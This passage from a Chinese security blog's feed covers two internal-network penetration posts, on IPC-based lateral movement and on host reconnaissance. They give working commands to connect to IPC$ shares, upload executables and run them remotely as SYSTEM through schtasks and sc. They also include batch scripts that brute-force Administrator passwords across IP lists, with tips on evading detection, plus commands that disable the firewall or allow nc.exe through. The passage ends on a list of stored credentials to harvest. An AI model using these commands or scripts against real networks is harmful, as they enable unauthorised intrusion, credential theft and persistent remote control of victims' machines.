id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>.建立空连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> <span class="string">&quot;&quot;</span> /u:<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">1</span>.建立正常连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> <span class="string">&quot;1qaz@WSX&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span> </span><br><span class="line"><span class="number">2</span>.查看本机连接共享情况</span><br><span class="line">net use</span><br><span class="line"><span class="number">3</span>.查看已建立连接目标主机的共享资源</span><br><span class="line">net view \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">4</span>.查看目标主机时间</span><br><span class="line">net time \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">5</span>.查看目标主机的NetBIOS用户（自己本机也需开启）</span><br><span class="line">nbtstat <span class="literal">-A</span> <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"><span class="number">6</span>.删除本机与指定ip建立的连接</span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">1.1</span>\ipc<span class="variable">$</span> /<span class="built_in">del</span> /y</span><br><span class="line"><span class="number">7</span>.删除本机所有已建立的连接</span><br><span class="line">net use * /<span class="built_in">del</span> /y</span><br><span class="line"><span class="number">8</span>.文件的上传下载与删除</span><br><span class="line"><span class="built_in">copy</span> plugin_update.exe \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\windows\temp\plugin_update.exe</span><br><span class="line">[推荐用<span class="type">xcopy</span>]:</span><br><span class="line">xcopy d:\sqlitedata\*.* \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\temp /E /Y /D</span><br><span class="line">（上传本地文件到目标的:c\windows\temp\目录下）</span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\plugin_update.exe c:\</span><br><span class="line">（下载目标文件到本地c盘下）</span><br><span class="line"><span class="built_in">del</span> \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\plugin_update.exe /F</span><br><span class="line">（删除目标文件）</span><br><span class="line"><span class="number">9</span>.创建计划任务之schtasks</span><br><span class="line">schtasks /create /tn <span class="string">&quot;plugin_update&quot;</span> /tr c:\windows\temp\plugin_update.exe /<span class="built_in">sc</span> once /st <span class="number">16</span>:<span class="number">32</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">补充<span class="number">1</span>：schtasks /create /tn <span class="string">&quot;Flash_Update&quot;</span> /tr C:\Users\Public\Flash_Update.exe /<span class="built_in">sc</span> minute /mo <span class="number">1</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">立即执行计划任务</span><br><span class="line">schtasks /run /tn <span class="string">&quot;plugin_update&quot;</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">删除计划任务</span><br><span class="line">schtasks /F /delete /tn <span class="string">&quot;plugin_update&quot;</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line">计划任务远程开启默认共享&#123;注意查看目标主机时间&#125;</span><br><span class="line">schtasks /create /tn <span class="string">&quot;plugin_update&quot;</span> /tr <span class="string">&quot;cmd /c net share c<span class="variable">$</span>=c:&quot;</span> /<span class="built_in">sc</span> once /st <span class="number">16</span>:<span class="number">25</span> /S <span class="number">192.168</span>.<span class="number">1.1</span> /RU System /u administrator /p <span class="string">&quot;1qaz@WSX&quot;</span></span><br><span class="line"><span class="number">10</span>.创建计划任务之at</span><br><span class="line">（at只支持win03和部分老版本win08，一般情况下，win08<span class="literal">-SP1</span>的系统是能添加at计划任务的，但不一定执行，推荐win08及之后的系统都选择schtasks创建计划任务）</span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">14</span>:<span class="number">05</span> cmd /c <span class="string">&quot;c:\windows\temp\test.bat&quot;</span> </span><br><span class="line"><span class="number">11</span>.SC创建服务</span><br><span class="line">（需先IPC连接，添加的常规程序需要有返回值,不然启动服务时会报<span class="number">1053</span>错误）</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> create shellsrv binpath= <span class="string">&quot;c:\shell.exe&quot;</span> <span class="built_in">start</span>= auto displayname= <span class="string">&quot;shellstart&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> create test binpath= <span class="string">&quot;c:\windows\temp\test.bat&quot;</span> <span class="built_in">start</span>= auto displayname= <span class="string">&quot;shellstart&quot;</span></span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> <span class="built_in">start</span> shllsrv</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> stop shllsrv</span><br><span class="line"><span class="built_in">sc</span> \\<span class="number">192.168</span>.<span class="number">1.1</span> delete shellsrv</span><br><span class="line"><span class="number">12</span>.删除默认共享</span><br><span class="line">net share c<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line"><span class="number">13</span>.恢复默认共享</span><br><span class="line">net share c<span class="variable">$</span>=c:</span><br><span class="line"><span class="number">15</span>.对方的c盘映射为自己的z盘，其他盘类推(不推荐)</span><br><span class="line">net use z: \\<span class="number">192.168</span>.<span class="number">1.1</span>\c<span class="variable">$</span> <span class="string">&quot;1qaz@WSX&quot;</span> /user:<span class="string">&quot;administrator&quot;</span></span><br><span class="line"><span class="number">16</span>.删除映射的c盘，其他盘类推</span><br><span class="line">net use c: /<span class="built_in">del</span></span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" title="批量爆破"></a>批量爆破</h3><p>内网中爆破弱口令时首选的便是使用<code>ipc</code>，爆破错误次数一般也不会做限制，但是一定要注意爆破成功的结果是否为匿名权限的<code>ipc</code>连接。</p><p>弱口令爆破这种手段在在内网中是一把双刃剑，如果公司领导未过于重视网络安全的话，导致信息安全部地位低下、资金有限，那么在缺乏安全设备监控与员工网络安全意识低下的情况下，在内网进行弱口令爆破是一件非常高效地事情，如大部分的央企、国企二级单位。</p><p>但另一方面，如果该公司确实在网络安全方面投入较大人力财力，那么弱口令爆破无异于自杀。</p><p>弱口令字典可由部分简单口令和部分复杂规则口令与企业名称+年份组成，如<code>12345678</code>,<code>000000</code>,<code>1q2w3e4r</code>,<code>1qaz2wsx</code>,<code>baidu@2020</code>,<code>baidu@123</code>等，不宜超过100条且建议单线程慢速爆破，避免被拦截。</p><p>使用说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip.txt 放入要爆破的IP</span><br><span class="line">pass.txt 放入爆破的密码</span><br><span class="line">默认爆破用户：Administrator</span><br><span class="line">爆破成功的结果，会在bat运行的当前目录生成pic.txt</span><br><span class="line">爆破进度的查询：type log.txt，完成后当前目录生成end.txt</span><br></pre></td></tr></table></figure><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><p>1.给定多个密码爆破</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt pass.txt</span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="keyword">FOR</span> /F %%p <span class="keyword">in</span> (%<span class="number">2</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;%%p&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span> &gt;&gt; log.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;%%p&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span>  &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> NOT errorlevel <span class="number">1</span> (</span><br><span class="line"><span class="built_in">echo</span> %%p  t:%%i&gt;&gt; pic.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line">)</span><br><span class="line">net use * /<span class="built_in">del</span> /y &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><p>2.固定密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span> &gt;&gt; log.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;123456&quot;</span> /user:<span class="string">&quot;%%i\Administrator&quot;</span>  &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> NOT errorlevel <span class="number">1</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i&gt;&gt; pic.txt</span><br><span class="line">net use \\%%i\ipc<span class="variable">$</span> /<span class="built_in">del</span></span><br><span class="line">)</span><br><span class="line">net use * /<span class="built_in">del</span> /y &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>温馨小提示：有杀软的内网环境中，尽量用<code>windows</code>自带功能来完成需求，使用工具要慎重，一定要本地做好测试在丢到目标上运行。</p><h4 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h4><p>不推荐，很容易就被杀软拦截，<a href="https://download.sysinternals.com/files/PSTools.zip">微软官方pstools</a> </p><p>域渗透学习（五）基于IPC的远程连接： <a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</a> </p><h4 id="Impacket套件"><a href="#Impacket套件" class="headerlink" title="Impacket套件"></a>Impacket套件</h4><p>更多的连接方式还有 <code>smbexec</code>、<code>psexec</code>、<code>atexec</code>， 都可在github社区中找到，比较简单的就是在 <code>impacket</code> 工具<br>包找到相关文件，使用方法自行查阅帮助文档，这里不再赘述。</p><p>python版：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>exe版：<a href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a>    v0.9.19稳</p><p>Impacket套件之远程命令执行功能讲解： <a href="https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA">https://mp.weixin.qq.com/s/kVTAe2BLya-lwOXzKdvHGA</a> </p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">SMB爆破/IPC/共享</td><td align="left">445端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/SmbScan.html">http://k8gege.org/Ladon/SmbScan.html</a></td></tr><tr><td align="left">Netbios爆破</td><td align="left">139端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/NbtScan.html">http://k8gege.org/Ladon/NbtScan.html</a></td></tr><tr><td align="left">SMB-NtlmHash爆破</td><td align="left">445端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/SmbHashScan.html">http://k8gege.org/Ladon/SmbHashScan.html</a></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于IPC的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|内网中的信息收集</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-07-12T07:10:24.000Z</published>
    <updated>2021-08-01T10:38:39.230Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。</p></blockquote><a id="more"></a><h2 id="工作组和域的区分"><a href="#工作组和域的区分" class="headerlink" title="工作组和域的区分"></a>工作组和域的区分</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.ipconfig /all</span><br><span class="line">有Primary Dns Suffix（主 DNS 后缀）就说明是域内，空的则当前机器应该在工作组。</span><br><span class="line"><span class="number">2</span>.net config workstation </span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">软件版本                      Windows <span class="number">10</span> Home China</span><br><span class="line">工作站域                       WORKGROUP</span><br><span class="line">登录域                          MicrosoftAccount</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">工作站域                     HACK7</span><br><span class="line">工作站域 DNS 名称            hack7.local</span><br><span class="line">登录域                       HACK7</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span class="number">3</span>.systeminfo</span><br><span class="line">这里注意字体大小写，工作组一般都是全大写，但是遇到的也有小写的情况，暂时不明白怎么设置的</span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">域:               hack7.local</span><br><span class="line">------------------------------------------------</span><br><span class="line"><span class="number">4</span>.net time /domain</span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">找不到域 WORKGROUP 的域控制器。</span><br><span class="line">请键入 NET HELPMSG <span class="number">3913</span> 以获得更多的帮助。</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=[需要域用户才能成功查询]</span><br><span class="line">------------------------------------------------</span><br><span class="line">\\DC.hack7.local的当前时间是<span class="number">2020</span>/<span class="number">7</span>/<span class="number">12</span> <span class="number">13</span>:<span class="number">21</span>:<span class="number">32</span></span><br><span class="line">------------------------------------------------</span><br></pre></td></tr></table></figure><h2 id="工作组内信息收集"><a href="#工作组内信息收集" class="headerlink" title="工作组内信息收集"></a>工作组内信息收集</h2><p>工作组采取的一般都是常规渗透方法，因为工作组一般都是个人和少数服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通常使用的方法有：</span><br><span class="line">扫描网段中的web服务，常用的有phpstudy，wampserver等，来寻找搭建的服务漏洞</span><br><span class="line">扫描开放端口信息，以及对应的服务，判断是否存在漏洞。</span><br><span class="line">扫描主机由于没有更新到最新版本导致的系统漏洞，比如MS17-010，补丁号为KB4013389</span><br><span class="line">hash抓取，hash注入，hash碰撞，口令爆破，IPC登陆，WMI，未授权访问，文件共享系统。</span><br><span class="line">ARP嗅探&#x2F;欺骗攻击（Cain和Ettercap）</span><br><span class="line">DNS劫持，会话劫持。</span><br><span class="line">社会工程学</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="用户系统信息收集"><a href="#用户系统信息收集" class="headerlink" title="用户系统信息收集"></a>用户系统信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看当前用户权限</span><br><span class="line">whoami /all</span><br><span class="line"><span class="number">2</span>.查看系统信息</span><br><span class="line">systeminfo</span><br><span class="line">systeminfo /S <span class="number">192.168</span>.<span class="number">1.101</span> /U testlab\test /P <span class="string">&quot;test&quot;</span> 查看远程机器的系统配置</span><br><span class="line"><span class="number">3</span>.查当前机器的机器名,知道当前机器是干什么的</span><br><span class="line">hostname</span><br><span class="line"><span class="number">4</span>.查看在线用户,注意管理员此时在不在</span><br><span class="line">quser</span><br><span class="line">query user</span><br><span class="line">qwinsta</span><br><span class="line"><span class="number">5</span>.查当前机器中所有的用户名,开始搜集准备用户名字典</span><br><span class="line">net user</span><br><span class="line"><span class="number">6</span>.查当前机器中所有的组名,了解不同组的职能,如：IT,HR,admin,file</span><br><span class="line">net localgroup</span><br><span class="line"><span class="number">7</span>.查指定组中的成员列表</span><br><span class="line">net localgroup <span class="string">&quot;Administrators&quot;</span></span><br><span class="line"><span class="number">8</span>.查询本机所有的盘符</span><br><span class="line">wmic logicaldisk get description,name,size,freespace /value</span><br><span class="line">fsutil fsinfo drives需要管理员权限</span><br><span class="line">fsutil fsinfo volumeinfo C:|findstr <span class="string">&quot;卷名&quot;</span> 查看卷名称，需要管理员权限</span><br><span class="line"><span class="number">9</span>.防火墙相关</span><br><span class="line">netsh firewall show state查看防火墙状态</span><br><span class="line">netsh firewall show config查看防火墙配置</span><br><span class="line">设置防火墙日志存储位置：</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">&quot;C:\Windows\temp\FirewallLOG.log&quot;</span></span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall get opmode disable  (WIN2003之前)</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off (WIN2003之后)</span><br><span class="line">允许某个程序的全连接：</span><br><span class="line">netsh firewall add allowdprogram C:\nc.exe <span class="string">&quot;allow nc&quot;</span> enable   (WIN2003之前)</span><br><span class="line">允许某个程序连入：</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line">允许某个程序外连：</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"><span class="number">10</span>.其他</span><br><span class="line"><span class="built_in">set</span> 查看当前机器的环境变量配置,看有没有我们可以直接利用到的语言环境</span><br><span class="line">ver 查看当前机器的NT内核版本,不弹窗</span><br><span class="line">winver 查看当前机器的NT内核版本,弹窗，在非图形界面不执行这个命令</span><br><span class="line">net share 查看当前机器开启的共享</span><br><span class="line">driverquery 查看当前机器安装的驱动列表</span><br><span class="line">net share public_dir=<span class="string">&quot;c:\public&quot;</span> /grant:Everyone,Full 设置共享</span><br><span class="line"><span class="built_in">dir</span> /a<span class="literal">-r</span><span class="literal">-d</span> /s /b找当前用户可读写目录,回显可能会很多</span><br></pre></td></tr></table></figure><h4 id="网络连接信息收集"><a href="#网络连接信息收集" class="headerlink" title="网络连接信息收集"></a>网络连接信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看tcp/udp网络连接状态信息</span><br><span class="line">netstat <span class="literal">-ano</span> 查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat <span class="literal">-anob</span> 查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;ESTABLISHED&quot;</span> 查看当前正处于连接状态的端口及ip</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;LISTENING&quot;</span> 查看当前正处于监听状态的端口及ip</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;TIME_WAIT&quot;</span> 查看当前正处于等待状态的端口及ip</span><br><span class="line"><span class="number">2</span>.查看网络配置</span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="number">3</span>.查看本地DNS缓存</span><br><span class="line">ipconfig /displaydns</span><br><span class="line"><span class="number">4</span>.查看路由表</span><br><span class="line">route print</span><br><span class="line"><span class="number">5</span>.查找有价值的内网arp通信记录</span><br><span class="line">arp <span class="literal">-a</span></span><br><span class="line"><span class="number">6</span>.跟踪本机出口ip</span><br><span class="line">tracert <span class="number">8.8</span>.<span class="number">8.8</span></span><br></pre></td></tr></table></figure><h4 id="软件进程信息收集"><a href="#软件进程信息收集" class="headerlink" title="软件进程信息收集"></a>软件进程信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看杀毒软件</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe</span><br><span class="line"><span class="number">2</span>.查看本机安装程序</span><br><span class="line">wmic product get name /value</span><br><span class="line">wmic product get name,version</span><br><span class="line"><span class="number">3</span>.查看当前机器的进程信息</span><br><span class="line">tasklist /svc 显示当前机器所有的进程所对应的服务 [只限于当前用户有权限看到的进程]</span><br><span class="line">tasklist /m 显示本地所有进程所调用的dll [同样只限于当前用户有权限看到的进程]</span><br><span class="line">tasklist /v 寻找进程中有无域管启用的进程，或者杀软进程</span><br><span class="line">tasklist /S <span class="number">192.168</span>.<span class="number">1.1</span> /U testlab\test /P <span class="string">&quot;test&quot;</span>查看远程主机进程列表</span><br><span class="line">taskkill /im iexplore.exe /f 用指定进程名的方式强行结束指定进程</span><br></pre></td></tr></table></figure><h4 id="历史凭证信息收集"><a href="#历史凭证信息收集" class="headerlink" title="历史凭证信息收集"></a>历史凭证信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">引用自：https://github.com/klionsec/RedTeamer</span><br><span class="line">批量抓取当前机器上的 <span class="string">&quot;各类基础服务配置文件中保存的各种账号密码&quot;</span></span><br><span class="line">   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...</span><br><span class="line">想办法 <span class="string">&quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;</span></span><br><span class="line">   比如, *.ls,*.doc,*.docx, *.txt....</span><br><span class="line">抓取各类 <span class="string">&quot;数据库客户端工具中保存各种数据库连接账号密码</span></span><br><span class="line"><span class="string">   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</span></span><br><span class="line"><span class="string">抓取当前系统 &quot;</span>注册表中保存的各类账号密码hash<span class="string">&quot; [ Windows ]</span></span><br><span class="line"><span class="string">抓取当前系统所有 &quot;</span>本地用户的明文密码/hash<span class="string">&quot; [ Windows &amp; linux ]</span></span><br><span class="line"><span class="string">抓取当前系统的所有 &quot;</span>用户token<span class="string">&quot; [ Windows ]</span></span><br><span 